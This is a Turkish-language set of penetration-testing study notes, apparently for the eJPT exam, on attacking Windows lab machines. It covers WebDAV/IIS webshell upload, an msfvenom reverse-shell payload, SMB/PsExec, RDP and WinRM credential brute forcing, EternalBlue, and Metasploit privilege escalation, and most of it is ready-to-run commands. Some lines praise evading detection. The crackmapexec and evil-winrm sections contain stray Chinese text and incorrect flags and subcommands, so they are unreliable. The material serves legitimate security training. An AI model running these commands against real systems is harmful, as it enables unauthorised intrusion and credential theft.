![[Pasted image 20240131125810.png]]
![[Pasted image 20240131133505.png]]
- Varsayılan olarak, Windows güvenli bir şekilde çalışacak şekilde yapılandırılmamıştır ve güvenli bir şekilde çalışması için güvenlik uygulamalarının proaktif bir şekilde uygulanmasını gerektirir.
- Microsoft tarafından yeni keşfedilen zayıf noktalar hemen yama ile kapatılmaz ve Windows'un parçalanmış yapısı nedeniyle birçok sistem yamasız bırakılır.

## Bir şirket yenisi çıkmasına rağmen ne kadar çok eski işletim sistemini kullanırsa o kadar çok zaafiyeti çıkar ver kullanılır. İşletim sistemleri piyasada kaldığı süre zarfında sürekli hacker'lar tarafında Zaafiyetleri bulunur ve zaafiyetler artar. 


---

#### <span style="background:#d4b106">Windows işletim sistemleri, C programlama dilinde geliştirildiği için buffer overflow, arbitrary code execution vb. gibi zayıf noktalara açıktır.</span>

---

## By Default Windows is vulnerable and requires end point protection.

### Bu yüzden Uygulanan Policy 'lerle -  End Point Protectionlarla korunur. Antivirus yüklenir. Configuration yapılması gerekir.

### Patch Management Yapılır

##### Win 10 cıktıgında microsoft onunla ufrastıgı için eski sürümlere saldırı yapıldığında bunun Patch'lerini hızlı çıkarmıyor.
---
![[Pasted image 20240131135414.png]]

---

![[Pasted image 20240131141030.png]]

----


![[Pasted image 20240131142236.png]]
![[Pasted image 20240131142529.png]]
## WebDAV  
WebDAV (Web Distributed Authoring and Versioning), web sunucuları aracılığıyla dosya ve içerik yönetimini destekleyen bir iletişim protokolüdür. Temel olarak, kullanıcılara uzaktan dosya yönetimi ve işbirliği imkanı sağlar. WebDAV, HTTP (Hypertext Transfer Protocol) üzerinden çalışır ve özellikle belge paylaşımı ve düzenleme gibi işlemleri kolaylaştırır.

- WebDAV, Microsoft'un IIS (Internet Information Services) web sunucu yazılımı ile uyumlu bir şekilde çalışır. IIS, WebDAV'ı destekleyerek kullanıcıların WebDAV protokolünü kullanarak dosya ve içerik yönetimini kolaylıkla gerçekleştirmelerine olanak tanır.
     WebDAV protokolü, IIS üzerinde çalışan bir web sunucusu üzerinden dosya ve içerik yönetimini sağlar. Bu, kullanıcılara web üzerinden dosyaları yönetme ve düzenleme imkanı sunar.

---
## RDP
#rdp-port-3389

---
## WinRM
  #winrm-port-5986-443
Windows Remote Management (WinRM), Windows işletim sistemli bilgisayarlar arasında <span style="background:#d4b106">uzaktan yönetim sağlamak için kullanılan bir protokoldür.</span> Bu protokol, uzaktan komut satırı erişimi ve PowerShell komutları gibi yönetim görevlerini gerçekleştirmek için tasarlanmıştır. 
### <span style="background:#d4b106">WinRM, Microsoft tarafından geliştirilmiş ve Windows PowerShell gibi yönetim araçları ile birlikte kullanılmaktadır.</span>

---

## 2. Exploiting Windows Vulnerabilities
#exploit-windows
![[Pasted image 20240131150106.png]]
#exploit-ISS
#exploit-microsoft-ISS
<span style="background:#d4b106">IIS (Internet Information Services) is a proprietary extensible web server software developed</span>
<span style="background:#d4b106">by Microsoft for use with the Windows NT family.</span>


<span style="background:#d4b106">Supported executable file extensions:</span>
<span style="background:#40a9ff">+ .asp</span>
<span style="background:#40a9ff">+ .aspx</span>
<span style="background:#40a9ff">+ .config</span>
<span style="background:#40a9ff">+ .php</span>

---

## WEBDAV ---> http server'a benziyor kullanılışı
#webdav
WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
● WebDAV essentially enables a web server to function as a file server for collaborative authoring.
● WebDAV runs on top Microsoft IIS on <span style="background:#d4b106">ports 80/443.</span>
## <span style="background:#d4b106">● In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.</span>

---
![[Pasted image 20240131162545.png]]
### İlk önce IIS ' de WEBdav var mı yok mu onu bulmak
### Sonra Bruteforce -->> Credentials
## Payload .asp yükle ve reverse shell al sistemden.

---

## Exploit
#webdav-exploit
#webdav 

#### Webdav port 80 de çalışıyor. SSL sertifikasız
### Webdav port 443 de çalışıyor SSL sertifikalı --->> O zaman authenticate gerekir. 

![[Pasted image 20240131230619.png]]

---
## 1. nmap
![[Pasted image 20240131231839.png]]
##### İlk yapılan Enum ayrıntı vermedi hemen --script'e başvuracağız
![[Pasted image 20240131231954.png]]
##### nmap sitesinden arattık
![[Pasted image 20240131225848.png]]
### nmap script http enum
```
nmap 192.168.1.7 -p80 -sV --script http-enum
```
#### Bize /webddav directory olduğunu script buldu

---

>[!note] Note: If http-enum script would take longer than expected then run dirb tool to find webdav directory.

```
dirb http://10.0.17.27
```

---
## davtest
#davtest
```
davtest -url http://10.0.17.27/webdav
```

![[Pasted image 20240131231419.png]]

We can notice, /webdav path is secured with basic authentication. We have the credentials access the /webdav path using the provided credentials i.e bob:password_123321
## devtest -auth
```
davtest -auth bob:password_123321 -url http://10.0.17.27/webdav
```

### Şimdi burada biz penteste başladığımızda yukarıdaki credential's bana verilmişti. bob:password_123321 olarak erişim sağladık.
![[Pasted image 20240131231647.png]]
![[Pasted image 20240131234351.png]]
## Geçici session numarasını dosya uzantısı sonuna ekleyerek dosyalar oluşturuyor. DEVtest
![[Pasted image 20240131234447.png]]
Bu uzantıları kotabilirim demekki.
#### Örnek asp yuklemesi başarılı olmuş demekki ben buraya asp payload yukleyebilirim demek. Testi bu şekilde yapmış oluyor.
ASPX uzantılı dosyalar, Microsoft'un ASP.NET çerçevesi tarafından kullanılan dinamik web sayfaları için kullanılır
#### Mozilla'dan girdiğimizde bu şekilde görüyoruz.
![[Pasted image 20240131232300.png]]
### Biz burada credential biliyoruz ama ya bilmeseydik. brute force kralı HYDRAAA
---


## Hydra Webdav
#hydra-webdav
#hydra-web-form
![[Pasted image 20240131232925.png]]
```
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /opt/rockyou.txt 192.168.1.7 http-get /webdav/

```
### Burada http-get bolumune ve /webdav/ bolumune dikkat et

#### BruteFORCE yaparken dikkatli olacağız DOS olmasına sebep olabilir.

---
## cadaver
#cadaver-webdav
#webdav 
![[Pasted image 20240131234753.png]]
![[Pasted image 20240131234916.png]]
### Biz yukarıda sisteme .asp uzantılı dosya yukleyebileceğimizi gördük. Şimdi asp uzantılı bir payload yaratacağız. Bunu Cadever ile WEBDAV içine yollayıp tetikleyeceğiz.

---
![[Pasted image 20240131235108.png]]
```
cadaver http://10.2.17.124/webdav
```
Username: bob
Password: password123321
#### Bizi webdav içine soktu bu credential'lerle.

---
## Kali Webshell's
![[Pasted image 20240131235516.png]]
### Kali içinde usr/share/webshells de web de kullanılaca shell kodlar hazır bulunuyor. bunları kendi IP'mize Portumuza göre düzenleyip karşı tarafa gönderip tetiklediğimizde reverse shellimizi alırız. Keyfimize bakarız.

![[Pasted image 20240131235725.png]]

```
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```
![[Pasted image 20240131235907.png]]
### /webdav directory'e asp uzantılı shellimizi koyduğumuzu görebilirsin.
## Webshell'lerde site üzerinden shell alıyormusuz.
##### ipconfig
![[Pasted image 20240201000138.png]]
![[Pasted image 20240201000049.png]]
## dir C:\
![[Pasted image 20240201000305.png]]
### Bizim için önemli olan flag.txt dosyasını okumak.
```
type C:\flag.txt
```

---

## WebDAV msfconsole
#webdav-msfconsole

## 1. multihandler dinleyici ile
## 2. direk msfconsole ile
### Zaten yukarda sisteme asp formatında payload yukleyebileceğimizi enumeration yapmıştık.
## msfvenom ile şimdi bu asp payloadı oluşturacağız

![[Pasted image 20240201001232.png]]
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
```

## ÇOK ÖNEMLİ NOT
>[!warning] Şimdi karşı tarafın 32 bitlik architecture'a sahip bir işletim sistemimi kullanıyor yoksa 64 bitlik mi kullanıyor bilmiyorsak her iki durumda da çalışacak x86 seçeneği yani 32 bitliki seçmekte fayda var. 
![[Pasted image 20240201001805.png]]
### Bunu cadaver ile yine göderiyoruz put komutu ile

![[Pasted image 20240201001924.png]]

![[Pasted image 20240201002324.png]]
### Multihandler listener run ile başlatıldı. Payload isimlerinin msfvenom ile aynı olmasını LPORT LHOST aynı mı dikkat.

![[Pasted image 20240201002434.png]]
![[Pasted image 20240201002450.png]]
![[Pasted image 20240201002509.png]]

---

## 2. direk msfconsole ile
![[Pasted image 20240201002648.png]]
```
msf6> search iis upload
```
```
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS 10.0.17.27
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit

```
### Burada directory PATH ismine dikkat edelim başına /webdav/ekliyoruz
![[Pasted image 20240201000843.png]]![[Pasted image 20240131235333.png]]
![[Pasted image 20240201003200.png]]
## msfconsole burada detection'dan kaçınmak için 
### 1. txt olarak sisteme sokuyor 
### 2. sonra asp formatına çevirip execute edip tettikliyor
### 3. reverse shell'i alınca da bizim payload'ı silip ortadan kaldırıyorç daha ne yapsın.



---
---

## Exploiting SMB With PsExec
#smb #smb-exploit

SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).
● <span style="background:#d4b106">SMB uses port 445 (TCP).</span> However, originally, SMB ran on top of NetBIOS using<span style="background:#d4b106"> port 139.</span>
## SAMBA #samba 
● SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices. <span style="background:#d4b106">PORT 445</span> --> LINUX

---


## SMB Authentication
#smb-authentication

● The SMB protocol utilizes two levels of authentication, namely:
<span style="background:#d4b106">+ User Authentication</span>
<span style="background:#d4b106">+ Share Authentication</span>

<span style="background:#ff4d4f">● User authentication - Users must provide a username and password in order to authenticate with the SMB server in order to access a share.</span>
<span style="background:#ff4d4f">● Share authentication - Users must provide a password in order to access restricted share.</span>

![[Pasted image 20240201113904.png]]
![[Pasted image 20240201114148.png]]
#psexec
PsExec'in authentication' SMB ile gerçekleşir.
Telnet'in yerine uzaktan erişim için kullanılıyor.
RDP aynısı ama GUI ile değil CMD ile çalışıyor.

### Credential'e ihtiyaç var girmek için
<span style="background:#d4b106">This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attac</span>k.
We can narrow down our brute-force attack to only include common Windows user accounts like:
+ Administrator--->>> En önemlisi bu ve eğer mümkünse bunu ele geçirmemiz çok önemli


### ● After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system <font color="#ffff00">via PsExec and execute arbitrary system commands or obtain a reverse shell.</font>

---
## Exploit - SMB Brute Force PsExec

![[Pasted image 20240201115951.png]]
```
nmap -p445 --script smb-protocols 10.0.0.242
```

```
nmap -p445 --script smb-* 10.0.0.242
```

![[Pasted image 20240201121235.png]]
## Buna göre Psexec ile biz bruteforce deneyebiliriz.

![[Pasted image 20240201121356.png]]
#### Önemli msfconsole postgresql aktif hale gelmesi için öalışması için

---

![[Pasted image 20240201120155.png]]

```
msf6> use auxiliary/scanner/smb/smb_login 
```

![[Pasted image 20240201120255.png]]

```
use auxiliary/scanner/smb/smb_login

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt

set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```


![[Pasted image 20240201120635.png]]

![[Pasted image 20240201123004.png]]

---

### Auxiliary Module ile Yaptığımız Brute Force ile Credentialleri Bulduk .
### Şimdi Bu cred ile exploit zamanı

#### msf6> search smb psexec
![[Pasted image 20240201123424.png]]
## use exploit/windows/smb/psexec
set RHOSTS 192.168.1.7
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
![[Pasted image 20240201123528.png]]

---

## Önemli Genel Bilgi Notu
### .exe uzantılı dosyaları Linux da çalıştırmak içi ne yapmalıyım. Örnek Psexec Windows dosyası bunu nasıl çalıştırabilirim ?
## WINE
#wine #wine-exe-linuxta-çalıştırma
Linux işletim sistemlerinde .exe uzantılı dosyalar genellikle doğrudan çalıştırılamaz, çünkü .exe dosyaları genellikle Windows işletim sistemine özgü yürütülebilir dosyalardır. Ancak, Wine adlı bir yazılım kullanarak Windows uygulamalarını Linux'ta çalıştırabilirsiniz.

Wine, Windows ortamını taklit eden bir ortam sağlar ve Linux üzerinde çeşitli Windows uygulamalarını çalıştırmanıza olanak tanır. Wine'ı kullanarak .exe dosyalarını çalıştırmak için şu adımları izleyebilirsiniz:

1. **Wine'ı Yükleyin:** Linux dağıtımınıza bağlı olarak, Wine'ı paket yöneticisi aracılığıyla yükleyebilirsiniz. Örneğin, Ubuntu ve türevleri için terminalde şu komutu kullanabilirsiniz:
    
```
    sudo apt-get install wine
```
    
    
2.  Wine'ı yükledikten sonra, .exe dosyanızın bulunduğu dizine gidin ve terminalde şu komutu kullanarak dosyayı çalıştırın:    
    `wine dosyaadi.exe`
    
    Burada "dosyaadi.exe" kısmını kendi .exe dosyanızın adıyla değiştirmelisiniz.
    

---

## Nifty - HAVALI - TOOL
![[Pasted image 20240201124344.png]]
### psexec.py   ---->> Kali de var gözünü seveyim Kali Herşey var
![[Pasted image 20240201124442.png]]

![[Pasted image 20240201124551.png]]

![[Pasted image 20240201124937.png]]

### Şimdi neden bu tekniği de kullandık. Çünkü bu teknikte Payload yok malicious code yok. Normal sanki yasal bir kullanıcı gibi kullanıcı adı ve şifre ile giriş yaptık. Detection ihtimali sıfır.

---


https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login
https://www.rapid7.com/db/modules/exploit/windows/smb/psexec )

---
---
---

## SMB - EternalBlue
![[Pasted image 20240201143055.png]]
● The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public
by a hacker group called the Shadow Brokers in 2017.
EternalBlue (MS17-010/CVE-2017-0144)
![[Pasted image 20240201143251.png]]
![[Pasted image 20240201143627.png]]
![[Pasted image 20240201143454.png]]

---
#### msf6> use
exploit(windows/smb/ms17_010_eternalblue)  

![[Pasted image 20240201150042.png]]
set RHOST
run

![[Pasted image 20240201150123.png]]


----
https://github.com/3ndG4me/AutoBlue-MS17-010
### MSFCONSOLE OLMADAN ETERNAL
##### Yukarıdaki github linkinden /opt klasörümüze AutoBlue-MS17-010 klasörünü indirdik.

```
## 1. python eternal_checker.py <TARGET-IP>
```
![[Pasted image 20240201150630.png]]
https://www.youtube.com/watch?v=p9OnxS1oDc0

https://www.youtube.com/watch?v=2FwqryKUoX8

### pip install requirement.txt   -->> bunu yaptıktan sonra shellcode klasörü içinde shell_pre.sh var bunu açtık ve talimatları takip ettik.

![[Pasted image 20240201151221.png]]
![[Pasted image 20240201151354.png]]
run `listener_prep.sh`

```
python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin> <Number of Groom Connections (optional)>
```

```
python eternalblue_exploit7.py 192.168.1.7 /opt/AutoBlue-MS17-010/shellcode/sc_all.bin
```

![[Pasted image 20240201153653.png]]
### Bu programla karşı taraf crash oldu


---


## Exploiting RDP
#rdp-exploit
![[Pasted image 20240201154346.png]]
## PORT 3389
### Authentication Required
#### Başka Portlarda da çalıştırılabilir buna dikkat PORT SCAN aşamasında

### Biz her zaman RDP'ye bağlanabiliriz sncsk bizim legitimate credentials'e ihtiyacımız var.

---
![[Pasted image 20240201222308.png]]
![[Pasted image 20240201222358.png]]
![[Pasted image 20240201231625.png]]
### Burada tek ne olduğu yazmayan port 3333 bu deneyeceğiz ve msfsonsole ile scan yapacağız. Normalde 3389 olsa zaten default olarak RDP olduğunu bileceğiz fakat burada öyle bir durum yok.
#### buradaki durumda örneğin RDP'ti başka portta çalıştırıyor.Enumeration buna göre devam edecek. 3389 Değil 3333


---
## MSFCONSOLE - RDP - SCANNER
#rdp-msfconsole
#rdp-scanner
#rdp-scanner-msfconsole
![[Pasted image 20240201223927.png]]
![[Pasted image 20240201224217.png]]
```
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 10.0.0.31
set RPORT 3333
exploit
```

![[Pasted image 20240201224005.png]]
### RDP olduğunu ve çalıştığı portları tespit ettik.
---
### Şimdi RDP'ye bağlanmak için Credentials'a ihtiyacımız var HYDRA imdadımıza yetişir.
## Hydra - RDP
#hydra-rdp

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333
```
### Yukarıdaki hydra kodunda port 3333 özelikle belirtmek için -s optionu koyuyoruz. unutma

![[Pasted image 20240201224336.png]]


### Şimdi username ve password elimizde olduğu için sıra geldi Remote Desktopa bağlanmaya

```
xfreerdp /u:administrator /p:qwertyuiop /v:10.0.0.31:3333
```
### port 3333 yazılışına dikkat et

#rdp-connect
#xfreerdp
![[Pasted image 20240201231355.png]]

**1. rdesktop:**
**2. freerdp:**
**3. xfreerdp:**
**4. Remmina:**
**5. Tsclient:**

---
---

![[Pasted image 20240202005100.png]]
#rdp-CVE-2019-0708
#rdp-bluekeep
## BlueKeep
### Exploiting Windows CVE-2019-0708 RDP Vulnerability

https://www.youtube.com/watch?v=Bh1H2Ez6A8Y
![[Pasted image 20240202005239.png]]
![[Pasted image 20240202005316.png]]
![[Pasted image 20240202005333.png]]
![[Pasted image 20240202005355.png]]
![[Pasted image 20240202005521.png]]
![[Pasted image 20240202005556.png]]
https://www.youtube.com/watch?v=Bh1H2Ez6A8Y
![[Pasted image 20240202010055.png]]

---
---

## WinRM
#winrm 
#winrm-exploit

![[Pasted image 20240202110848.png]]

● Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate <span style="background:#d4b106">remote access with Windows systems over HTTP(S).</span>


● WinRM is typically used in the following ways:

1. Remotely access and interact with Windows hosts on a local network. 
2. Remotely access and execute commands on Windows systems.
3. Manage and configure Windows systems remotely.

### <span style="background:#d4b106">4. WinRM typically uses TCP port 5985 and 5986 (HTTPS).</span>


---
WinRM implements access control and security for communication between systems through various forms of <span style="background:#d4b106">authentication.</span>


## crackmapexec
#crackmapexec
#crackmapexec-winrm
#crackmapexec-bruteforce
We can utilize a utility called “crackmapexec” to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.

---

## CrackMapExec nedir?

CrackMapExec, kimlik doğrulama bilgilerini ve kimlik bilgilerini toplamak için uzaktaki Windows sistemlerine karşı çeşitli saldırılar gerçekleştiren bir açık kaynaklı araçtır. Active Directory ortamlarında kimlik avı ve kimlik yükseltme saldırıları yürütmek için kullanılabilir.

CrackMapExec'in bazı temel özellikleri şunlardır:

- SMB ve WMI'ya karşı kimlik avı saldırıları
- NTLM kimlik doğrulama bilgilerini çalmak için kimlik bilgisi dökümü
- Yerel yönetici ayrıcalıklarını yükseltmek için PsExec
- Metasploit modülü entegrasyonu

CrackMapExec,滲透测试人员和安全研究人员评估Windows网络安全性的强大工具。

## Kullanım Komutları

CrackMapExec'in birçok komutu vardır, ancak en yaygın kullanılanlardan birkaçı şunlardır:

- **-u** Kullanıcı adı
- **-p** Şifre
- **-l** Hedef sistemlerin listesi
- **-d** Alan adı
- **-x** Saldırı türü
- **-o** Çıktı dosyası

CrackMapExec'i kullanmaya ilişkin bazı örnekler şunlardır:

- **SMB kimlik avı saldırısı gerçekleştirmek için:**

```
crackmapexec smb -u testuser -p password -l targets.txt
```

- **WMI kimlik avı saldırısı gerçekleştirmek için:**

```
crackmapexec wmi -u testuser -p password -l targets.txt
```

- **Kimlik bilgilerini dökmek için:**

```
crackmapexec creddump -u testuser -p password -l targets.txt
```

- **PsExec kullanarak uzaktan bir komut çalıştırmak için:**

```
crackmapexec psexec -u testuser -p password -l targets.txt -c "whoami"
```

---

## evil-winrm
We can also utilize a ruby script called “evil-winrm” to obtain a command shell session on the target system.

#evil-winrm-winrm-exploit
#evil-winrm 
#evil-winrm-shell

---

## Evil-WinRM Nedir?

Evil-WinRM, Windows sistemlerine karşı saldırılar gerçekleştirmek için PowerShell ve WinRM'yi kullanan açık kaynaklı bir araçtır. Kimlik doğrulama bilgilerini toplamak, kimlik yükseltmek ve uzaktan kod çalıştırmak için kullanılabilir.

Evil-WinRM'nin bazı temel özellikleri şunlardır:

- SMB ve HTTP üzerinden WinRM'ye bağlanma
- NTLM ve Kerberos kimlik doğrulama desteği
- Kimlik bilgisi dökümü ve kimlik yükseltme saldırıları
- Metasploit modülü entegrasyonu

Evil-WinRM,滲透测试人员和安全研究人员评估Windows网络安全性的强大工具。

## Kullanım Komutları

Evil-WinRM'nin birçok komutu vardır, ancak en yaygın kullanılanlardan birkaçı şunlardır:

- **-u** Kullanıcı adı
- **-p** Şifre
- **-t** Hedef sistem
- **-c** Komut
- **-o** Çıktı dosyası

Evil-WinRM'i kullanmaya ilişkin bazı örnekler şunlardır:

- **WinRM üzerinden bir komut çalıştırmak için:**

```
evil-winrm -u testuser -p password -t target.com -c "whoami"
```

- **Kimlik bilgilerini dökmek için:**

```
evil-winrm -u testuser -p password -t target.com -c "Get-NetUser"
```

- **Kerberos kimlik doğrulama kullanarak bir sisteme bağlanmak için:**

```
evil-winrm -u testuser@contoso.com -k -t target.com -c "whoami"
```

---

## WinRM'de söyle bir DURUM SÖZ KONUSU --->> Default olarak  sistemde açık değil. Kullanmak için özellikle configure etmek gerekiyor.

### Sistem yöneticilerinin hayatını kolaylaştırmak için yapılmıştır.
#### İnternet üzerinden Windows Server Üzerinden de çalıştırılıp internet üzerinden de uzaktan erişim sağlayabiliyor.

---
### Yönetici host'larda bu özelliği aktif hale getirip basit bir username password ile erişim sağlayabilir.

---

## WinRM credential's elde etmek çok önemli. Çünkü elde ettiğin anda direk remote shell'e sahip oluyorsun.

---

![[Pasted image 20240202134809.png]]
## nmap 
```
nmap --top-ports 7000 10.0.0.173
```
### Burada port 5985'i gördüüğümüzde WinRM olduğunu bilip buna göre attack Vektörünü hazırlıyoruz.

![[Pasted image 20240202135011.png]]
#### Buradaki windows-banner'ı tam olarak açıkça WinRM çalıştırdığını söylemiyor. Ama biz port numarasından bunu biliyoruz.

```
nmap -p5986 10.0.0.173 -sV
```

---
## CRACKMAPEXEC
#crackmapexec 
![[Pasted image 20240202135434.png]]

## Bu tool'u pentestlerde çok fazla kullanacaksın dikkat et.

### Desteklediği protokullere bakmak en önemli bölüm.
![[Pasted image 20240202135628.png]]
Sadece WinRm de değil  ssh   mssql   smb   ldap   rdp   ftp  bunların hepsinde kullanılabiliyor..

## crackmapexec winrm 10.0.2.17 -u administrator -p /opt/rockyou.txt

```
crackmapexec winrm 10.0.2.17 -u administrator -p /opt/rockyou.txt
```

### Burada özellikle administrator yazdık çünkü zaten bu sistem yöneticilerinin kontrolünde olacak şekilde ayarlanmış bir tool. İstersek oraya bir username list de koyabiliriz.

![[Pasted image 20240202140223.png]]
![[Pasted image 20240202140344.png]]

## crackmapexec winrm 10.0.2.17 -u administrator -p tinkerbell -x "whoami"
```
crackmapexec winrm 10.0.2.17 -u administrator -p tinkerbell -x "whoami"
```

![[Pasted image 20240202140449.png]]

```
crackmapexec winrm 10.0.2.17 -u administrator -p tinkerbell -x "sysinfo"
```

![[Pasted image 20240202140539.png]]
### Biz asıl şifreyi bruteforce ile bulduğumuz için burada log'larla tespit edilme diye birşey veya firewall'un bizi engellemesi olmaz.

## Shell nasıl alacağız.
#evil-winrm-shell 
#evil-winrm 

![[Pasted image 20240202140854.png]]

![[Pasted image 20240202140938.png]]

```
evil-winrm -u administrator -p 'tinkerbell' -i 10.0.2.17
```

![[Pasted image 20240202141051.png]]

![[Pasted image 20240202141147.png]]





---
## msfconsole
![[Pasted image 20240202135129.png]]

```
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.0.0.173
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```


![[Pasted image 20240202141245.png]]
### administrator
### tinkerbell olarak buldu

---

```
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS 10.0.0.173
exploit

```

---


![[Pasted image 20240202141533.png]]
## set FORCE_VBS true

use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.0.0.173
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit

![[Pasted image 20240202141754.png]]
![[Pasted image 20240202141805.png]]
## meterpreter shell'i aldık
![[Pasted image 20240202141848.png]]

---
----

# Privilege Escalation
#windows-Privilege-Escalation
![[Pasted image 20240205080725.png]]
Privilege escalation is the process of exploiting vulnerabilities or misconfigurations in systems to elevate privileges from one user to another, typically to a user with administrative or root access on a system.

## Windows Kernel
#windows-kernel 

A Kernel is a computer program that is the <span style="background:#d4b106">core of an operating system</span> and <span style="background:#d4b106">has complete control over every resource and hardware on a system.</span> 
### It acts as a translation layer between hardware and software and facilitates the communication between these two layers.


### <span style="background:#d4b106">Windows NT</span> 
is the kernel that comes pre-packaged with all versions of Microsoft Windows and <span style="background:#d4b106">operates as a traditional kernel </span>with a few exceptions based on user
design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
<span style="background:#d4b106">- User Mode – </span>Programs and services running in user mode <font color="#ffff00">have limited access</font> to system resources and 
functionality.
3rd party applications -- End point Users


<span style="background:#d4b106">- Kernel Mode –</span> Kernel mode has <font color="#ffff00">unrestricted access </font>to system resources and functionality with the added functionality of managing devices and system
memory.


## Windows Kernel Exploitation
#Windows-kernel-exploitation  

### Eğer biz kernel modda kernel space de bir kod yürütmeyi başarabilirsek bu en üst yetki seviyesinde olacaktırç ya ROOT ya da administrator yetkisiyle olacaktır. Bu yüzden biz Kernel Exploit yapmaya çalışıyoruz.

## Methodology:
### 1. <span style="background:#d4b106">+ Identifying </span>kernel vulnerabilities

### 2. <span style="background:#d4b106">Downloading, compiling</span> and transferring kernel exploits onto the target system.
### öNCE COMPRIMISE OLDUGUMUZ windows sistemle alakalı kernel vulnerabilty'ler belirlenir ve attack vektörü oluşturulur.
### Sonra erişim sağladığımız hedef sisteme kernel exploit'leri toparlayıp, yukleyip transfer ederiz.


#### Önemli NOT--->> Kernel Exploitler her Windows Versiyonuna göre değişir. 

>[!warning] KERNEL EXPLOIT PLANSIZ YAPILAN BİR YETKI YUKSELTME SALDIRISI DEĞİLDİR. ÇÜNKÜ KERNEL İLE ETKİLEŞİME GİRDİĞİNDE SYSTEM'I KOMPLE CRASH ETME OLASILIĞIN ÇOK YUKSEKTIR.
>DATA KAYBINA NEDEN OLABILIR
>KURUMSAL BIR ALANDA KULLANILMASI COK SAKINCALIDIR BIR ETIK HACKER OLARAK MUSTERİYE ZARAR VEREBİLİRSİN.
>





## Tools & Environment
### Windows-Exploit-Suggester
#Windows-Exploit-Suggester

This tool compares a targets patch levels against the
Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.

## Bu bir Python Tool 'dur. Bizim eJPT klasöründe ve /OPT klasmründe var.

### + GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester


---
### Windows-Kernel-Exploits
#Windows-Kernel-Exploits - 

Collection of Windows Kernel exploits sorted by CVE.
+ GitHub: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135

### Bu windows kernel exploit'lerin toparlandığı bir koleksiyondur. Yukarıdaki link de versiyonlarına patch 'lerine göre kullanılabilecek exploitler ve var.
![[Pasted image 20240205114500.png]]
### CVE numaralarına göre sıralanmış exploitler

---

### Lab ortamı yaratmak için ve 10.0.2.18 deki Win7'e bağlanmak için hemen bir msfvenom'dan Payload yarattım. Bunu da python3 -m http.server 80 ile karşıya gönderdim.

## Multihandler ile dinlemeyi yaptık ve shell'imizi aldık. Şimdi Priv Escalete için hazırız.

![[Pasted image 20240205121008.png]]

---
![[Pasted image 20240205121239.png]]
## getprivs
### Bu komutla hangi priviledge'lere sahip olduğumuzu görüyoruz. Kısıtlı yetkiya sahip olduğumuzu da görüyoruz.
![[Pasted image 20240205121314.png]]

## Windows Yetki Yükseltme Metadoloji

### 1. Erişim sağladığın sistemde KERNEL EXPLOIT 'ları nasıl tespit edeceğine bak

##### Önce Meterpreter Shell aldığım için 
## 1. getsystem 
### Bu komutu deniyoruz.
![[Pasted image 20240205121735.png]]
Yukarıdaki methodları meterpreter deniyor ama başarısız.


### meterpreter> background
![[Pasted image 20240205122033.png]]
##### Msfconsole'un çok kullanışlı bir modulu var WINDOWS VULNERABILITY ENUMERATION İÇİN 

#msf-windows-vuln-enum
![[Pasted image 20240205122155.png]]
### msf6> search suggester
### msf6> use 0
#### Bu göründüğü gibi POST EXPLOTATION MODULE
##### Bu ayrıca birçok işletim sistemi için kullanılan bir module 'dur.

![[Pasted image 20240205122530.png]]

### Hedefteki Vuln'ları tek tek sıraladı
![[Pasted image 20240205125936.png]]


---
## ms10_092_schelevator
Bu Zaafiyeti şimdi Google'layıp nasıl exploit edileceklerine bakacağız.
https://www.rapid7.com/db/modules/exploit/windows/local/ms10_092_schelevator/

![[Pasted image 20240205130718.png]]
![[Pasted image 20240205130740.png]]
#### Açıklamaları okuduktan sonra bunun kernel exploit olmadığını anlıyoruz.


## ms16_014_wmi_recv_notif/
### Bu şkeilde başka bir zaafiyet var ders öğretmeninin bilgisayarında
https://www.rapid7.com/db/modules/exploit/windows/local/ms16_014_wmi_recv_notif/

##### use exploit/windows/local/ms16_014_wmi_recv_notif

---
![[Pasted image 20240205131025.png]]

![[Pasted image 20240205131041.png]]

![[Pasted image 20240205131250.png]]

![[Pasted image 20240205131544.png]]

>[!warning] Burada post exploit yaparken şuna dikkat etmelisin. Ben zaten port 4444 'de shell aldığım için o portta işlem yapmam dogru olmaz. module by default port 4444 'e göre işlem yapacaksa bir sonraki yetki yukseltme safhasında burada portu boş olan portla değiştirmek lazım.

### set LPORT 4422

![[Pasted image 20240205132200.png]]
♣Burada portu değiştirerek devam ettik örneğin.
![[Pasted image 20240205132544.png]]

